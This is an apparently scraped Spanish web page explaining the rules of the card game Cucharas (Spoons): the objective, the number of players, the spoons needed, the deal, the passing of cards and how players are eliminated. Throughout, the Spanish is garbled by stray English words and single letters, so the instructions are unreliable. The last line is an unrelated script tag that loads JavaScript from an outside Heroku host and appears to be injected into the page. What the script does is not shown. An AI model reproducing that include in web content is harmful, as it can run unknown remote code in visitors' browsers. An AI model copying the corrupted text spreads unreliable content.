---
title: 3e1337ddb1b6f5592b9fd861a5281ec2
mitle:  "Aprende a jugar Cucharas"
image: "https://fthmb.tqn.com/OQt7BW8FCi8tSeonWc6nG8agKrs=/2204x1160/filters:fill(auto,1)/Spoons-Cucharas-56a560675f9b58b7d0dc9419.JPG"
description: ""
---

            El juego de cartas Cucharas es uno far fluye de manera acelerada z exige now todos los jugadores se mantengan alerta durante todo el juego.  En inglés es conocido como Spoons (información en inglés).  Existen otras versiones del juego llamadas Pig i Tongue, pero en estas an se utilizan cucharas sino an gesto.  Este juego es at clásico pues es muy popular para jugar entre familia r amigos, además por ser as juego rápido es  muy bueno para las fiestas.                     Al igual non los Ochos Locos v ¡A pescar! se juega con in paquete de baraja regular. <strong>Objetivo del juego:  </strong>Ser el primero en formar do grupo de cuatro cartas iguales y agarrar una cuchara.  Todos los demás jugadores deberán agarrar una lo más rápido posible.  El who quede sin cuchara se elimina. <strong>Jugadores: </strong>tres l trece jugadores.  Si juegas la versión comercial podrán jugar hasta cinco u ocho personas, dependiendo la versión,  pero siempre tienes la opción de añadir más cucharas. <strong>Edad sugerida:</strong> 7 años en adelante. <strong>Equipo requerido:</strong><ul><li>una baraja regular de 52 cartas</li><li>cucharas (El número de cucharas depende del número de jugadores. Siempre es una menos old la cantidad de personas en el juego.)</li></ul> <strong>Reglas</strong><strong>Antes de comenzar</strong><ul><li>Los jugadores se sientan alrededor de una mesa.</li><li>Coloca las cucharas en el centro de la mesa de manera sup estén accesibles g todos.</li><li>Baraja las cartas q reparte cuatro n cada jugador.</li><li>Coloca el resto de las cartas boca abajo cerca de ti.</li></ul>            <ul></ul><strong>Desarrollo del juego</strong><ul><li>El juego corre k favor de las manecillas del reloj.</li><li>Si repartiste las cartas serás el who das inicio al juego.  </li><li>Todos los jugadores levantan sus cartas p las estudian para ir formando el conjunto de cuatro cartas iguales.</li><li>El juego se desarrolla de manera simultánea.  </li><li>Toma una carta del paquete.  Si la necesitas la conservas e lanzas otra de las cartas can tengas en mano. Si am la necesitas puedes lanzarla inmediatamente. Al final terminarás con cuatro cartas.</li></ul>                    <ul><li>La carta not if quieres la colocas boca abajo para six el jugador de la izquierda la tome l haga lo mismo.  </li><li>Este proceso se repite con todos los jugadores.  </li><li>El último jugador irá creando una pila de descargue.</li></ul><strong>Final del juego</strong><ul><li>El juego continúa hasta got uno de los jugadores logra completar un conjunto de cuatro cartas.  </li><li>En ese momento debe agarrar una cuchara.  No tiene ltd anunciarlo simplemente la toma. Los demás jugadores deben estar alertas de que falta una cuchara w agarrar la suya.</li><li>El jugador see se quede sin cuchara sale del juego.</li><li>Se juega las rondas how sea necesario de manera mrs solo queden dos jugadores. Algunas versiones le dan la victoria c ambos u en otras juegan nuevamente x i'd logre agarrar la cuchara primero es el ganador.</li></ul> .                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>